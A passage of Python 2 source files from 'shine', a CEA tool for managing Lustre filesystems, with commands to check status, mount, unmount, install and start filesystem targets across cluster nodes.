            ldic.append(dict([["type", "CLI"], ["count", len(fs.clients)],
                ["nodes", "%s" % fs.get_client_servers()], ["status", ', '.join(status)]]))

        layout = AsciiTableLayout()
        layout.set_show_header(True)
        layout.set_column("type", 0, AsciiTableLayout.CENTER, "type", AsciiTableLayout.CENTER)
        layout.set_column("count", 1, AsciiTableLayout.RIGHT, "#", AsciiTableLayout.CENTER)
        layout.set_column("nodes", 2, AsciiTableLayout.LEFT, "nodes", AsciiTableLayout.CENTER)
        layout.set_column("status", 3, AsciiTableLayout.LEFT, "status", AsciiTableLayout.CENTER)

        print "FILESYSTEM COMPONENTS STATUS (%s)" % fs.fs_name
        AsciiTable().print_from_list_of_dict(ldic, layout)

    status_view_fs = classmethod(status_view_fs)


    def status_view_disks(self, fs):
        """
        View: lustre disks
        """

        print "FILESYSTEM DISKS (%s)" % fs.fs_name

        # override dict to allow target sorting by index
        class target_dict(dict):
            def __lt__(self, other):
                return self["index"] < other["index"] 
        ldic = []
        jdev_col_enabled = False
        tag_col_enabled = False
        for type, (all_targets, enabled_targets) in fs.targets_by_type():
            for target in enabled_targets:

                if target.state == OFFLINE:
                    status = "offline"
                elif target.state == RECOVERING:
                    status = "recovering %s" % target.status_info
                elif target.state == MOUNTED:
                    status = "online"
                elif target.state == TARGET_ERROR:
                    status = "ERROR"
                elif target.state == RUNTIME_ERROR:
                    status = "CHECK FAILURE"
                else:                    
                    status = "UNKNOWN"

                if target.dev_size >= TERA:
                    dev_size = "%.1fT" % (target.dev_size/TERA)
                elif target.dev_size >= GIGA:
                    dev_size = "%.1fG" % (target.dev_size/GIGA)
                elif target.dev_size >= MEGA:
                    dev_size = "%.1fM" % (target.dev_size/MEGA)
                elif target.dev_size >= KILO:
                    dev_size = "%.1fK" % (target.dev_size/KILO)
                else:                    
                    dev_size = "%d" % target.dev_size

                if target.jdev:
                    jdev_col_enabled = True
                    jdev = target.jdev
                else:                    
                    jdev = ""

                if target.tag:
                    tag_col_enabled = True
                    tag = target.tag
                else:                    
                    tag = ""

                flags = []
                if target.has_need_index_flag():
                    flags.append("need_index")
                if target.has_first_time_flag():
                    flags.append("first_time")
                if target.has_update_flag():
                    flags.append("update")
                if target.has_rewrite_ldd_flag():
                    flags.append("rewrite_ldd")
                if target.has_writeconf_flag():
                    flags.append("writeconf")
                if target.has_upgrade14_flag():
                    flags.append("upgrade14")
                if target.has_param_flag():
                    flags.append("conf_param")

                ldic.append(target_dict([\
                    ["nodes", NodeSet.fromlist(target.servers)],
                    ["dev", target.dev],
                    ["size", dev_size],
                    ["jdev", jdev],
                    ["type", target.type.upper()],
                    ["index", target.index],
                    ["tag", tag],
                    ["label", target.label],
                    ["flags", ' '.join(flags)],
                    ["fsname", target.fs.fs_name],
                    ["status", status]]))

        ldic.sort()
        layout = AsciiTableLayout()
        layout.set_show_header(True)
        i = 0
        layout.set_column("dev", i, AsciiTableLayout.LEFT, "device",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("nodes", i, AsciiTableLayout.LEFT, "node(s)",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("size", i, AsciiTableLayout.RIGHT, "dev size",
                AsciiTableLayout.CENTER)
        if jdev_col_enabled:
            i += 1
            layout.set_column("jdev", i, AsciiTableLayout.RIGHT, "journal device",
                    AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("type", i, AsciiTableLayout.LEFT, "type",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("index", i, AsciiTableLayout.RIGHT, "index",
                AsciiTableLayout.CENTER)
        if tag_col_enabled:
            i += 1
            layout.set_column("tag", i, AsciiTableLayout.LEFT, "tag",
                    AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("label", i, AsciiTableLayout.LEFT, "label",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("flags", i, AsciiTableLayout.LEFT, "ldd flags",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("fsname", i, AsciiTableLayout.LEFT, "fsname",
                AsciiTableLayout.CENTER)
        i += 1
        layout.set_column("status", i, AsciiTableLayout.LEFT, "status",
                AsciiTableLayout.CENTER)

        AsciiTable().print_from_list_of_dict(ldic, layout)


# Umount.py -- Unmount file system on clients
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `umount' command classes.

The umount command aims to stop Lustre filesystem clients.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSClientLiveCommand import FSClientLiveCommand
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler
from Shine.Lustre.FileSystem import *


class GlobalUmountEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_stopclient_start(self, node, client):
        if self.verbose > 1:
            print "%s: Unmounting %s on %s ..." % (node, client.fs.fs_name, client.mount_path)

    def ev_stopclient_done(self, node, client):
        if self.verbose > 1:
            if client.status_info:
                print "%s: Umount: %s" % (node, client.status_info)                    
            else:
                print "%s: FS %s succesfully unmounted from %s" % (node,
                        client.fs.fs_name, client.mount_path)

    def ev_stopclient_failed(self, node, client, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to unmount FS %s from %s: %s" % \
                (node, client.fs.fs_name, client.mount_path, strerr)
        if rc:
            print message


class Umount(FSClientLiveCommand):
    """
    shine umount
    """

    def __init__(self):
        FSClientLiveCommand.__init__(self)

    def get_name(self):
        return "umount"

    def get_desc(self):
        return "Unmount file system clients."

    target_status_rc_map = { \
            MOUNTED : RC_FAILURE,
            RECOVERING : RC_FAILURE,
            OFFLINE : RC_OK,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None,
                    GlobalUmountEventHandler(vlevel))

            nodes = self.nodes_support.get_nodeset()

            fs_conf, fs = open_lustrefs(fsname, None,
                    nodes=nodes,
                    indexes=None,
                    event_handler=eh)

            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):
                raise CommandException("%s are not client nodes of filesystem '%s'" % \
                        (nodes - fs_conf.get_client_nodes(), fsname))

            fs.set_debug(self.debug_support.has_debug())

            status = fs.umount()
            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:
                if vlevel > 0:
                    print "Unmount successful."                    
            elif rc == RC_RUNTIME_ERROR:
                for nodes, msg in fs.proxy_errors:
                    print "%s: %s" % (nodes, msg)

        return result



# FSProxyAction.py -- Lustre generic FS proxy action class
# Copyright (C) 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Globals import Globals
from Shine.Configuration.Configuration import Configuration

from ProxyAction import *

from ClusterShell.NodeSet import NodeSet


class FSProxyAction(ProxyAction):
    """
    Generic file system command proxy action class.
    """

    def __init__(self, fs, action, nodes, debug, targets_type=None, targets_indexes=None):
        ProxyAction.__init__(self)
        self.fs = fs
        self.action = action
        assert isinstance(nodes, NodeSet)
        self.nodes = nodes
        self.debug = debug
        self.targets_type = targets_type
        self.targets_indexes = targets_indexes

        if self.fs.debug:
            print "FSProxyAction %s on %s" % (action, nodes)

    def launch(self):
        """
        Launch FS proxy command.
        """
        command = ["%s" % self.progpath]
        command.append(self.action)
        command.append("-f %s" % self.fs.fs_name)
        command.append("-R")

        if self.debug:
            command.append("-d")

        if self.targets_type:
            command.append("-t %s" % self.targets_type)
            if self.targets_indexes:
                command.append("-i %s" % self.targets_indexes)

        # Schedule cluster command.
        self.task.shell(' '.join(command), nodes=self.nodes, handler=self)

    def ev_read(self, worker):
        node, buf = worker.last_read()
        try:
            event, params = self._shine_msg_unpack(buf)
            self.fs._handle_shine_event(event, node, **params)
        except ProxyActionUnpackError, e:
            # ignore any non shine messages
            pass

    def ev_close(self, worker):
        """
        End of proxy command.
        """
        # Gather nodes by return code
        for rc, nodes in worker.iter_retcodes():
            # rc 127 = command not found
            # rc 126 = found but not executable
            if rc >= 126:                    
                # Gather these nodes by buffer
                for buffer, nodes in worker.iter_buffers(nodes):
                    # Handle proxy command error which rc >= 127 and 
                    self.fs._handle_shine_proxy_error(nodes, "Remote action %s failed: %s" % \
                            (self.action, buffer))

        self.fs.action_refcnt -= 1
        if self.fs.action_refcnt == 0:
            worker.task.abort()


# CommandRegistry.py -- Shine commands registry
# Copyright (C) 2007, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

# Base command class definition
from Base.Command import Command

# Import list of enabled commands (defined in the module __init__.py)
from Shine.Commands import commandList

from Exceptions import *


# ----------------------------------------------------------------------
# Command Registry
# ----------------------------------------------------------------------


class CommandRegistry:
    """Container object to deal with commands."""

    def __init__(self):
        self.cmd_list = []
        self.cmd_dict = {}
        self.cmd_optargs = {}

        # Autoload commands
        self._load()

    def __len__(self):
        "Return the number of commands."
        return len(self.cmd_list)

    def __iter__(self):
        "Iterate over available commands."
        for cmd in self.cmd_list:
            yield cmd

    # Private methods

    def _load(self):
        for cmdobj in commandList:
            self.register(cmdobj())

    # Public methods

    def get(self, name):
        return self.cmd_dict[name]

    def register(self, cmd):
        "Register a new command."
        assert isinstance(cmd, Command)

        self.cmd_list.append(cmd)
        self.cmd_dict[cmd.get_name()] = cmd

        # Keep an eye on ALL option arguments, this is to insure a global
        # options coherency within shine and allow us to intermix options and
        # command -- see execute() below.
        opt_len = len(cmd.getopt_string)
        for i in range(0, opt_len):
            c = cmd.getopt_string[i]
            if c == ':':
                continue
            has_arg = not (i == opt_len - 1) and (cmd.getopt_string[i+1] == ':')
            if c in self.cmd_optargs:
                assert self.cmd_optargs[c] == has_arg, "Incoherency in option arguments"
            else:
                self.cmd_optargs[c] = has_arg 

    def execute(self, args):
        """
        Execute a shine script command.
        """
        # Get command and options. Options and command may be intermixed.
        command = None
        new_args = []
        try:
            # Find command through options...
            next_is_arg = False
            for opt in args:
                if opt.startswith('-'):
                    new_args.append(opt)
                    next_is_arg = self.cmd_optargs[opt[-1:]]
                elif next_is_arg:
                    new_args.append(opt)
                    next_is_arg = False
                else:
                    if command:
                        # Command has already been found, so?
                        if command.has_subcommand():
                            # The command supports subcommand: keep it in new_args.
                            new_args.append(opt)
                        else:
                            raise CommandHelpException("Syntax error.", command)
                    else:
                        command = self.get(opt)
                    next_is_arg = False
        except KeyError, e:
            raise CommandNotFoundError(opt)

        # Parse
        command.parse(new_args)

        # Execute
        return command.execute()                    


# Install.py -- File system installation commands
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 

from Shine.FSUtils import create_lustrefs

from Base.Command import Command
from Base.Support.LMF import LMF
from Base.Support.Nodes import Nodes


class Install(Command):
    """
    shine install -f /path/to/model.lmf
    """
    
    def __init__(self):
        Command.__init__(self)

        self.lmf_support = LMF(self)
        self.nodes_support = Nodes(self)

    def get_name(self):
        return "install"

    def get_desc(self):
        return "Install a new file system."

    def execute(self):
        if not self.opt_m:
            print "Bad argument"                    
        else:
            # Use this Shine.FSUtils convenience function.
            fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),
                    event_handler=self)

            install_nodes = self.nodes_support.get_nodeset()

            # Install file system configuration files; normally, this should
            # not be done by the Shine.Lustre.FileSystem object itself, but as
            # all proxy methods are currently handled by it, it is more
            # convenient this way...
            fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes)

            if install_nodes:
                nodestr = " on %s" %  install_nodes
            else:
                nodestr = ""

            print "Configuration files for file system %s have been installed " \
                    "successfully%s." % (fs_conf.get_fs_name(), nodestr)

            if not install_nodes:
                # Print short file system summary.
                print
                print "Lustre targets summary:"
                print "\t%d MGT on %s" % (fs.mgt_count, fs.mgt_servers)
                print "\t%d MDT on %s" % (fs.mdt_count, fs.mdt_servers)
                print "\t%d OST on %s" % (fs.ost_count, fs.ost_servers)
                print

                # Give pointer to next user step.
                print "Use `shine format -f %s' to initialize the file system." % \
                        fs_conf.get_fs_name()

            return 0                    


# Mount.py -- Mount file system on clients
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `mount' command classes.

The mount command aims to start Lustre filesystem clients.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSClientLiveCommand import FSClientLiveCommand
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

from Exceptions import CommandException

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler
from Shine.Lustre.FileSystem import *

class GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_startclient_start(self, node, client):
        if self.verbose > 1:
            print "%s: Mounting %s on %s ..." % (node, client.fs.fs_name, client.mount_path)

    def ev_startclient_done(self, node, client):
        if self.verbose > 1:
            if client.status_info:
                print "%s: Mount: %s" % (node, client.status_info)                    
            else:
                print "%s: FS %s succesfully mounted on %s" % (node,
                        client.fs.fs_name, client.mount_path)

    def ev_startclient_failed(self, node, client, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to mount FS %s on %s: %s" % \
                (node, client.fs.fs_name, client.mount_path, strerr)
        if rc:
            print message


class Mount(FSClientLiveCommand):
    """
    """

    def __init__(self):
        FSClientLiveCommand.__init__(self)

    def get_name(self):
        return "mount"

    def get_desc(self):
        return "Mount file system clients."

    target_status_rc_map = { \
            MOUNTED : RC_OK,
            RECOVERING : RC_FAILURE,
            OFFLINE : RC_FAILURE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None,
                    GlobalMountEventHandler(vlevel))

            nodes = self.nodes_support.get_nodeset()

            fs_conf, fs = open_lustrefs(fsname, None,
                    nodes=nodes,
                    indexes=None,
                    event_handler=eh)

            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):
                raise CommandException("%s are not client nodes of filesystem '%s'" % \
                        (nodes - fs_conf.get_client_nodes(), fsname))

            fs.set_debug(self.debug_support.has_debug())

            status = fs.mount(mount_options=fs_conf.get_mount_options())
            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:                    
                if vlevel > 0:                    
                    print "Mount successful."                    
            elif rc == RC_RUNTIME_ERROR:                    
                for nodes, msg in fs.proxy_errors:                    
                    print "%s: %s" % (nodes, msg)                    

        return result


# Preinstall.py -- File system installation commands
# Copyright (C) 2007, 2008 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

from Shine.FSUtils import create_lustrefs

from Base.RemoteCommand import RemoteCommand
from Base.Support.FS import FS

import os

class Preinstall(RemoteCommand):
    """
    shine preinstall -f <filesystem name> -R
    """
    
    def __init__(self):
        RemoteCommand.__init__(self)
        self.fs_support = FS(self)

    def get_name(self):
        return "preinstall"

    def get_desc(self):
        return "Preinstall a new file system."

    def is_hidden(self):
        return True

    def execute(self):
        try:
            conf_dir_path = Globals().get_conf_dir()
            if not os.path.exists(conf_dir_path):
                os.makedirs(conf_dir_path, 0755)
        except OSError, ex:
            print "OSError"                    
            raise                    


# Start.py -- Start file system
# Copyright (C) 2007, 2008, 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `start' command classes.

The start command aims to start Lustre filesystem servers or just some
of the filesystem targets on local or remote servers. It is available
for any filesystems previously installed and formatted.
"""

import os

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

from Shine.Commands.Status import Status
from Shine.Commands.Tune import Tune

# Command base class
from Base.FSLiveCommand import FSLiveCommand
from Base.FSEventHandler import FSGlobalEventHandler
from Base.CommandRCDefs import *
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler

# Command helper
from Shine.FSUtils import open_lustrefs

# Lustre events
import Shine.Lustre.EventHandler

# Shine Proxy Protocol
from Shine.Lustre.Actions.Proxies.ProxyAction import *
from Shine.Lustre.FileSystem import *


class GlobalStartEventHandler(FSGlobalEventHandler):

    def __init__(self, verbose=1):
        FSGlobalEventHandler.__init__(self, verbose)

    def handle_pre(self, fs):
        if self.verbose > 0:
            print "Starting %d targets on %s" % (fs.target_count,
                    fs.target_servers)

    def handle_post(self, fs):
        if self.verbose > 0:
            Status.status_view_fs(fs, show_clients=False)

    def ev_starttarget_start(self, node, target):
        # start/restart timer if needed (we might be running a new runloop)
        if self.verbose > 1:
            print "%s: Starting %s %s (%s)..." % (node, \
                    target.type.upper(), target.get_id(), target.dev)
        self.update()

    def ev_starttarget_done(self, node, target):
        self.status_changed = True
        if self.verbose > 1:
            if target.status_info:
                print "%s: Start of %s %s (%s): %s" % \
                        (node, target.type.upper(), target.get_id(), target.dev,
                                target.status_info)
            else:
                print "%s: Start of %s %s (%s) succeeded" % \
                        (node, target.type.upper(), target.get_id(), target.dev)
        self.update()

    def ev_starttarget_failed(self, node, target, rc, message):
        self.status_changed = True
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "%s: Failed to start %s %s (%s): %s" % \
                (node, target.type.upper(), target.get_id(), target.dev,
                        strerr)
        if rc:
            print message
        self.update()


class LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_starttarget_start(self, node, target):
        if self.verbose > 1:
            print "Starting %s %s (%s)..." % (target.type.upper(),
                    target.get_id(), target.dev)

    def ev_starttarget_done(self, node, target):
        if self.verbose > 1:
            if target.status_info:
                print "Start of %s %s (%s): %s" % (target.type.upper(),
                        target.get_id(), target.dev, target.status_info)
            else:
                print "Start of %s %s (%s) succeeded" % (target.type.upper(),
                        target.get_id(), target.dev)

    def ev_starttarget_failed(self, node, target, rc, message):
        if rc:
            strerr = os.strerror(rc)
        else:
            strerr = message
        print "Failed to start %s %s (%s): %s" % (target.type.upper(),
                target.get_id(), target.dev, strerr)
        if rc:
            print message


class Start(FSLiveCommand):
    """
    shine start [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]
    """

    def __init__(self):
        FSLiveCommand.__init__(self)

    def get_name(self):
        return "start"

    def get_desc(self):
        return "Start file system servers."

    target_status_rc_map = { \
            MOUNTED : RC_OK,
            RECOVERING : RC_OK,
            OFFLINE : RC_FAILURE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):
        result = 0

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        target = self.target_support.get_target()
        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(LocalStartEventHandler(vlevel),
                    GlobalStartEventHandler(vlevel))

            # Open configuration and instantiate a Lustre FS.
            fs_conf, fs = open_lustrefs(fsname, target,
                    nodes=self.nodes_support.get_nodeset(),
                    indexes=self.indexes_support.get_rangeset(),
                    event_handler=eh)

            # Prepare options...
            mount_options = {}
            mount_paths = {}
            for target_type in [ 'mgt', 'mdt', 'ost' ]:
                mount_options[target_type] = fs_conf.get_target_mount_options(target_type)
                mount_paths[target_type] = fs_conf.get_target_mount_path(target_type)

            fs.set_debug(self.debug_support.has_debug())

            # Will call the handle_pre() method defined by the event handler.
            if hasattr(eh, 'pre'):
                eh.pre(fs)
                
            status = fs.start(mount_options=mount_options,
                              mount_paths=mount_paths)

            rc = self.fs_status_to_rc(status)
            if rc > result:
                result = rc

            if rc == RC_OK:
                if vlevel > 0:
                    print "Start successful."
                tuning = Tune.get_tuning(fs_conf)
                status = fs.tune(tuning)
                if status == RUNTIME_ERROR:
                    rc = RC_RUNTIME_ERROR
                # XXX improve tuning on start error handling

            if rc == RC_RUNTIME_ERROR:
                for nodes, msg in fs.proxy_errors:
                    print "%s: %s" % (nodes, msg)

            if hasattr(eh, 'post'):
                eh.post(fs)

            return rc                    

# Status.py -- Check remote filesystem servers and targets status
# Copyright (C) 2009 CEA
#
# This file is part of shine
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.
#
# $Id$

"""
Shine `status' command classes.

The status command aims to return the real state of a Lustre filesystem
and its components, depending of the requested "view". Status views let
the Lustre administrator to either stand back and get a global status
of the filesystem, or if needed, to enquire about filesystem components
detailed states.
"""

# Configuration
from Shine.Configuration.Configuration import Configuration
from Shine.Configuration.Globals import Globals 
from Shine.Configuration.Exceptions import *

# Command base class
from Base.FSLiveCommand import FSLiveCommand
from Base.CommandRCDefs import *
# Additional options
from Base.Support.View import View
# -R handler
from Base.RemoteCallEventHandler import RemoteCallEventHandler


# Error handling
from Exceptions import CommandBadParameterError

# Command helper
from Shine.FSUtils import open_lustrefs

# Command output formatting
from Shine.Utilities.AsciiTable import *

# Lustre events and errors
import Shine.Lustre.EventHandler
from Shine.Lustre.Disk import *
from Shine.Lustre.FileSystem import *

from ClusterShell.NodeSet import NodeSet

import os


(KILO, MEGA, GIGA, TERA) = (1024, 1048576, 1073741824, 1099511627776)


class GlobalStatusEventHandler(Shine.Lustre.EventHandler.EventHandler):

    def __init__(self, verbose=1):
        self.verbose = verbose

    def ev_statustarget_start(self, node, target):
        pass

    def ev_statustarget_done(self, node, target):
        pass

    def ev_statustarget_failed(self, node, target, rc, message):
        print "%s: Failed to status %s %s (%s)" % (node, target.type.upper(), \
                target.get_id(), target.dev)
        print ">> %s" % message

    def ev_statusclient_start(self, node, client):
        pass

    def ev_statusclient_done(self, node, client):
        pass

    def ev_statusclient_failed(self, node, client, rc, message):
        print "%s: Failed to status of FS %s" % (node, client.fs.fs_name)
        print ">> %s" % message


class Status(FSLiveCommand):
    """
    shine status [-f <fsname>] [-t <target>] [-i <index(es)>] [-n <nodes>] [-qv]
    """

    def __init__(self):
        FSLiveCommand.__init__(self)
        self.view_support = View(self)

    def get_name(self):
        return "status"

    def get_desc(self):
        return "Check for file system target status."


    target_status_rc_map = { \
            MOUNTED : RC_ST_ONLINE,
            RECOVERING : RC_ST_RECOVERING,
            OFFLINE : RC_ST_OFFLINE,
            TARGET_ERROR : RC_TARGET_ERROR,
            CLIENT_ERROR : RC_CLIENT_ERROR,
            RUNTIME_ERROR : RC_RUNTIME_ERROR }

    def fs_status_to_rc(self, status):
        return self.target_status_rc_map[status]

    def execute(self):

        result = -1                    

        self.init_execute()

        # Get verbose level.
        vlevel = self.verbose_support.get_verbose_level()

        target = self.target_support.get_target()
        for fsname in self.fs_support.iter_fsname():

            # Install appropriate event handler.
            eh = self.install_eventhandler(None, GlobalStatusEventHandler(vlevel))

            fs_conf, fs = open_lustrefs(fsname, target,
                    nodes=self.nodes_support.get_nodeset(),
                    indexes=self.indexes_support.get_rangeset(),
                    event_handler=eh)

            fs.set_debug(self.debug_support.has_debug())

            status_flags = STATUS_ANY
            view = self.view_support.get_view()

            # default view
            if view is None:
                view = "fs"
            else:                    
                view = view.lower()

            # disable client checks when not requested
            if view.startswith("disk") or view.startswith("target"):
                status_flags &= ~STATUS_CLIENTS
            # disable servers checks when not requested
            if view.startswith("client"):
                status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)

            statusdict = fs.status(status_flags)

            if RUNTIME_ERROR in statusdict:
                # get targets that couldn't be checked
                defect_targets = statusdict[RUNTIME_ERROR]

                for nodes, msg in fs.proxy_errors:
                    print nodes
                    print '-' * 15
                    print msg
                print

            else:                    
                defect_targets = []

            rc = self.fs_status_to_rc(max(statusdict.keys()))
            if rc > result:
                result = rc

            if view == "fs":                    
                self.status_view_fs(fs)                    
            elif view.startswith("target"):                    
                self.status_view_targets(fs)                    
            elif view.startswith("disk"):                    
                self.status_view_disks(fs)                    
            else:                    
                raise CommandBadParameterError(self.view_support.get_view(),                    
                        "fs, targets, disks")                    
        return result

    def status_view_targets(self, fs):
        """
        View: lustre targets
        """
        print "FILESYSTEM TARGETS (%s)" % fs.fs_name

        # override dict to allow target sorting by index
        class target_dict(dict):
            def __lt__(self, other):
                return self["index"] < other["index"]

        ldic = []
        for type, (all_targets, enabled_targets) in fs.targets_by_type():
            for target in enabled_targets:

                if target.state == OFFLINE:
                    status = "offline"
                elif target.state == TARGET_ERROR:
                    status = "ERROR"
                elif target.state == RECOVERING:
                    status = "recovering %s" % target.status_info
                elif target.state == MOUNTED:
                    status = "online"
                else:                    
                    status = "UNKNOWN"

                ldic.append(target_dict([["target", target.get_id()],
                    ["type", target.type.upper()],
                    ["nodes", NodeSet.fromlist(target.servers)],
                    ["device", target.dev],
                    ["index", target.index],
                    ["status", status]]))

        ldic.sort()
        layout = AsciiTableLayout()
        layout.set_show_header(True)
        layout.set_column("target", 0, AsciiTableLayout.LEFT, "target id",
                AsciiTableLayout.CENTER)
